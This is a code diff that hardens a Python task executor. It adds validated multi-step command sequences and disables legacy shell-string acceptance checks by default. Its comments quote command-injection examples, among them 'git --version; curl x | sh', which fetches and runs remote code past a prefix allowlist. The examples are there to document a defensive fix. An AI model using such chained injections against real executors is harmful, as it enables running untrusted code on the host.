@@ -74,8 +74,30 @@ def _typed_argv(command: Any, policy: CommandPolicy | None) -> list[str]:
     return list(command)
 
 
+def _typed_argv_sequence(commands: Any, policy: CommandPolicy | None) -> list[list[str]]:
+    """Validate a `commands` sequence: several typed argvs, run in order, all must pass.
+
+    This exists so the safe path can express what tasks actually need. `command` holds a
+    single argv, so `a && b` had no typed form and authors reached for an `acceptance`
+    shell string instead — which is why the unsafe path outlived the benchmark that
+    condemned it (`command_policy_benchmark_v1.py`: the legacy prefix allowlist lets
+    `git --version & echo injected>x` through; the typed policy blocks it). An unsafe
+    path survives while the safe one cannot do the job.
+    """
+    if not isinstance(commands, list) or not commands:
+        raise CommandRejected("commands must be a non-empty list of argv lists")
+    return [_typed_argv(entry, policy) for entry in commands]
+
+
 class ShellExecutor:
-    """Run a task's acceptance command. ok = exit 0. No model, fully local."""
+    """Run a task's acceptance check. ok = exit 0. No model, fully local.
+
+    Three forms, in precedence order:
+      * ``commands`` — several typed argvs run in sequence; all must pass (the safe `&&`).
+      * ``command``  — one typed argv.
+      * ``acceptance`` — a legacy shell string. Unvalidatable and off by default; see
+        ``allow_legacy_shell``.
+    """
 
     def __init__(
         self,
@@ -84,17 +106,47 @@ class ShellExecutor:
         timeout: int = 600,
         allowlist: list[str] | None = None,
         command_policy: CommandPolicy | None = None,
-        allow_legacy_shell: bool = True,
+        allow_legacy_shell: bool = False,
         clock: Callable[[], float] = time.perf_counter,
     ) -> None:
         self.cwd = str(cwd)
         self.timeout = timeout
+        # NOTE: `allowlist` filters legacy shell strings by prefix only. It is a convenience
+        # filter, NOT a security boundary: the string still reaches `shell=True`, so
+        # "git --version; curl x | sh" passes a ["git --version"] allowlist. This is measured,
+        # not theorised — see command_policy_benchmark_v1.py. Use `command_policy` + typed
+        # `command`/`commands` for anything a model can populate.
         self.allowlist = allowlist
         self.command_policy = command_policy
         self.allow_legacy_shell = allow_legacy_shell
         self.clock = clock
 
+    def _run_sequence(self, argvs: list[list[str]]) -> tuple[bool, str, float]:
+        started = self.clock()
+        outputs = []
+        for argv in argvs:
+            try:
+                proc = subprocess.run(
+                    argv, cwd=self.cwd, capture_output=True, text=True, timeout=self.timeout
+                )
+            except FileNotFoundError:
+                return False, f"command not found: {argv[0]}", max(self.clock() - started, 0.0)
+            except subprocess.TimeoutExpired:
+                return False, f"timeout after {self.timeout}s", max(self.clock() - started, 0.0)
+            outputs.append(f"exit {proc.returncode}: {_tail(proc.stdout + proc.stderr)}")
+            if proc.returncode != 0:
+                # Same short-circuit as `&&`: a failing step stops the chain.
+                return False, " | ".join(outputs), max(self.clock() - started, 0.0)
+        return True, " | ".join(outputs), max(self.clock() - started, 0.0)
+
     def execute(self, task: dict[str, Any]) -> tuple[bool, str, float]:
+        commands = task.get("commands")
+        if commands is not None:
+            try:
+                argvs = _typed_argv_sequence(commands, self.command_policy)
+            except CommandRejected as exc:
+                return False, f"blocked: {exc}", 0.0
+            return self._run_sequence(argvs)
         command = task.get("command")
         if command is not None:
             try:
@@ -144,7 +196,7 @@ class CodexExecutor:
         extra_args: list[str] | None = None,
         timeout: int = 1800,
         command_policy: CommandPolicy | None = None,
-        allow_legacy_shell: bool = True,
+        allow_legacy_shell: bool = False,
         clock: Callable[[], float] = time.perf_counter,
     ) -> None:
         self.cwd = str(cwd)
@@ -176,8 +228,18 @@ class CodexExecutor:
             return False, f"codex exec timeout after {self.timeout}s", max(self.clock() - started, 0.0)
         ok = proc.returncode == 0
         # If the task carries an acceptance check, the code must also pass it.
+        commands = task.get("commands")
         command = task.get("command")
         acceptance = task.get("acceptance")
+        if ok and commands is not None:
+            try:
+                argvs = _typed_argv_sequence(commands, self.command_policy)
+            except CommandRejected as exc:
+                return False, f"codex exit 0; acceptance blocked: {exc}", max(self.clock() - started, 0.0)
+            seq_ok, seq_result, _ = ShellExecutor(
+                self.cwd, timeout=self.timeout, command_policy=self.command_policy, clock=self.clock
+            )._run_sequence(argvs)
+            return seq_ok, f"codex exit 0; acceptance {seq_result}", max(self.clock() - started, 0.0)
         if ok and command is not None:
             try:
                 argv = _typed_argv(command, self.command_policy)
